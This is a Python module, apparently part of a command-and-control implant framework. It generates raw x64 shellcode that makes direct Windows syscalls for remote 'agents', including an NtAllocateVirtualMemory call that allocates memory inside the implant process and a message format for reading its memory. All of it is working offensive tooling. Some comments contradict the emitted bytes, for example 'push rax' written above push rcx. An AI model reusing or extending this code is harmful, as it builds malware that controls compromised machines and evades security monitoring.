import struct
from models.syscall import Syscall
from models.agent import Agent

class PTR():
    code= b""
    memory = 0
    def __init__(self, data, memory):
        self.code = self.copy_bytecode(memory,data)
        self.memory = memory
    
    def copy_bytecode(self, dest_addr, data_bytes):
        """
        Generates x64 bytecode to copy 'data_bytes' directly to 'dest_addr'.
        Uses the CALL/POP technique to get the address of the inline data.
        """
        bytecode = bytearray()
        data_bytes = bytearray(data_bytes)
        data_len = len(data_bytes)


        # 1. JMP over the data to the execution logic and preserve RAX
        # push rax
        # EB <8-bit offset>
        bytecode.extend(b'\x51')
        bytecode.extend(b'\xeb')
        bytecode.extend(struct.pack('<B', data_len))

        # 2. THE DATA (The arbitrary byte array)
        bytecode.extend(data_bytes)

        # 3. THE LOGIC (We jump here first)
        # CALL back to the instruction immediately after the JMP (which is the data)
        # E8 0x0
        # The offset is: -(data_len + 5) because CALL is 5 bytes long.
        bytecode.extend(b'\xe8')
        bytecode.extend(struct.pack('<i', 0))

        # 4. POP the address of the data (pushed by CALL) into RSI (Source)
        # OpCode: 5e
        bytecode.extend(b'\x5e')
        # 5. Sub RSI length of data to copy +0x8 - 0x3
        # OpCode: 48 83 ee + length
        bytecode.extend(b'\x48\x83\xee')
        bytecode.extend(struct.pack('<B',data_len+0x8-3))

        # 6. Load Destination Address into RDI (48 bf + 8 bytes)
        bytecode.extend(b'\x48\xbf')
        bytecode.extend(struct.pack('<Q', dest_addr)) 

        # 7. Load Length into RCX (48 b9 + 8 bytes)
        bytecode.extend(b'\x48\xb9')
        bytecode.extend(struct.pack('<Q', data_len))

        # 8. Instruction: REP MOVSB (f3 a4)
        # pop RAX
        bytecode.extend(b'\xf3\xa4')
        bytecode.extend(b'\x59')


        return bytes(bytecode)

def push_syscall(syscall_number, params, retparams= []):
    bytecode = bytearray()
    bytecode.extend(b'\x53')      # push rbx
    bytecode.extend(b'\x55')      # push rbp
    bytecode.extend(b'\x57')      # push rdi
    bytecode.extend(b'\x56')      # push rsi
    bytecode.extend(b'\x41\x54')  # push r12
    bytecode.extend(b'\x41\x55')  # push r13
    bytecode.extend(b'\x41\x56')  # push r14
    bytecode.extend(b'\x41\x57')  # push r15
    # 1. PUSH Extra Parameters (5 and above) FIRST
    # These must be pushed in REVERSE order (right-to-left)
    if len(params) > 4:
        for param in reversed(params[4:]):
            if type(param) == PTR:
                bytecode.extend(param.code)
                # MOV RAX, imm64
                bytecode.extend(b'\x48\xb8')
                bytecode.extend(struct.pack('<Q', param.memory))
            else:
                bytecode.extend(b'\x48\xb8')
                bytecode.extend(struct.pack('<Q', param))
            # PUSH RAX
            bytecode.extend(b'\x50')


    # 2. ALLOCATE SHADOW SPACE (0x20 bytes) LAST
    # This pushes 0x0 4 times.
    bytecode.extend(b'\x6A\x00')
    bytecode.extend(b'\x6A\x00')
    bytecode.extend(b'\x6A\x00')
    bytecode.extend(b'\x6A\x00')

    # 3. Load Parameters 1-4 into Registers (RCX, RDX, R8, R9)
    regs = [b'\x48\xb9', b'\x48\xba', b'\x49\xb8', b'\x49\xb9']
    for i in range(min(len(params), 4)):
        if type(params[i]) == PTR:
            bytecode.extend(params[i].code)
            bytecode.extend(regs[i])
            bytecode.extend(struct.pack('<Q', params[i].memory))
        else:
            bytecode.extend(regs[i])
            bytecode.extend(struct.pack('<Q', params[i]))

    # 4. Set Syscall Number (MOV EAX, syscall_id)
    bytecode.extend(b"\x49\x89\xca")
    bytecode.extend(b'\xb8')
    bytecode.extend(struct.pack('<I', syscall_number))
    # 5. This pushes 0x0
    bytecode.extend(b'\x6A\x00')
    # 6. Syscall Instruction
    bytecode.extend(b'\x0f\x05')
    bytecode.extend(b"\x48\x83\xc4")
    stack_align = 0x28
    if len(params) > 4:
        stack_align +=8*(len(params)-4)
    bytecode.extend(struct.pack('<B',stack_align))

    bytecode.extend(
    b'\x41\x5f'      # pop r15
    b'\x41\x5e'      # pop r14
    b'\x41\x5d'      # pop r13
    b'\x41\x5c'      # pop r12
    b'\x5e'          # pop rsi
    b'\x5f'          # pop rdi
    b'\x5d'          # pop rbp
    b'\x5b'          # pop rbx
    )
    # 7. ret
    bytecode.extend(b'\xc3')

    return (bytes(bytecode))

def readmemory(address, size):
    retmessage = bytearray()
    retmessage.extend(b'\x01')
    retmessage.extend(struct.pack('<Q', address))
    retmessage.extend(struct.pack('<Q', size))
    return retmessage

def allocmem(agent_id, size, protection):
    agent = Agent.by_id(agent_id)
    syscall = Syscall.sys(agent.id, "NtAllocateVirtualMemory")
    ProcessHandle = 0xFFFFFFFFFFFFFFFF
    BaseAddress = PTR(b"\x00\x00\x00\x00\x00\x00\x00\x00", int(agent.scratchpad,16))
    zero_bits = 0
    RegionSize = PTR(bytearray(struct.pack('<I', size)), int(agent.scratchpad,16)+8)
    AllocationType = 0x3000
    retparams = [int(agent.scratchpad,16), int(agent.scratchpad,16)+8]
    return (retparams, push_syscall(syscall, [ProcessHandle, BaseAddress, zero_bits, RegionSize, AllocationType, protection]))


